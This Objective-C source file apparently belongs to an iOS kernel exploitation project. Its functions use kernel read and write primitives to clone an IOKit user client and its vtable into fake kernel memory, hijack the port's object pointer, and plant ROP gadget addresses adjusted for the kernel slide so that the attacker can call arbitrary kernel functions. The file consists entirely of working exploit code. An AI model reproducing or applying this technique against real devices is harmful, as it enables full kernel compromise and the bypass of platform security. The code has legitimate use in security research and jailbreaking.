//
//  handoff.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/4/24.
//

#import <Foundation/Foundation.h>
#import "handoff.h"
#import "../offsets.h"
#import "../krw.h"
#import "../kcall.h"
#import "../ipc.h"

void setup_remote_client(io_connect_t conn, pid_t pid, uint64_t *vtb, uint64_t *cli) {
    uint64_t userclient_port = port_name_to_ipc_port_for_pid((mach_port_t)conn, pid);
    uint64_t userclient_addr = kread64(userclient_port + off_ipc_port_ip_kobject);
    uint64_t userclient_vtab = kread64(userclient_addr);
    
    uint64_t fakevtb = kalloc(0x1000);
    uint64_t fakecli = kalloc(0x1000);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_vtab + i * 8);
        kwrite64(fakevtb + i * 8, data);
    }
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_addr + i * 8);
        kwrite64(fakecli + i * 8, data);
    }
    kwrite64(fakecli, fakevtb);
    kwrite64(userclient_port + off_ipc_port_ip_kobject, fakecli);
    kwrite64(fakevtb + 8 * 0xB8, off_add_x0_x0_0x40_ret + get_kslide());
    *vtb = fakevtb;
    *cli = fakecli;
}

void install_kernel_primitive(uint64_t cli, uint64_t vtb) {    
    kwrite64(cli + 0x48, off_mov_x012345__br_x6 + get_kslide()/*0x4242424242424242*/);
    kwrite64(cli + 0x40, 0x41414141);
}
